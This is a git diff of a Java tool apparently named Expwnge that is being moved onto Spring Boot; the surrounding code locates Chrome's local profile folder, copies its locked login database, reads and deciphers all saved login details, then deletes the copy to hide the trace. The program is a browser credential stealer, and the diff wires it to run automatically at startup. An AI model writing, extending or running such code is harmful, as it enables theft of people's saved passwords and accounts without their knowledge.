@@ -10,11 +10,24 @@ import java.nio.file.StandardOpenOption;
 import java.util.List;
 
 import org.apache.log4j.Logger;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.boot.CommandLineRunner;
+import org.springframework.boot.SpringApplication;
+import org.springframework.boot.autoconfigure.SpringBootApplication;
+import org.springframework.context.annotation.ImportResource;
+import org.springframework.scheduling.annotation.EnableAsync;
+import org.springframework.scheduling.annotation.EnableScheduling;
 
 import hax.expwnge.dao.LoginDAO;
 import hax.expwnge.models.Login;
 
-public class Expwnge {
+@SpringBootApplication
+@EnableAsync
+@EnableScheduling
+@ImportResource("classpath:applicationContext.xml")
+public class Expwnge implements CommandLineRunner {
+  @Autowired
+  private LoginDAO loginDAO;
   private static final Logger LOGGER = Logger.getLogger(Expwnge.class);
 
   /**
@@ -28,11 +41,12 @@ public class Expwnge {
     }
   }
 
-  private Expwnge() {
-    //Do not instantiate.
+  public static void main(String[] args) {
+    SpringApplication.run(Expwnge.class, args);
   }
 
-  public static void main(String[] args) {
+  @Override
+  public void run(String... args) throws Exception {
     String chromeFolder = System.getenv("LOCALAPPDATA")+"/Google/Chrome/User Data/Default/";
     
     /** Copy file to dance around database file lock **/
@@ -44,7 +58,7 @@ public class Expwnge {
     }
 
     /** Read and decipher all login details **/
-    List<Login> logins = new LoginDAO().getLoginDetails(resultPath);
+    List<Login> logins = loginDAO.getLoginDetails(resultPath);
     
     /** Delete the database copy **/
     try {
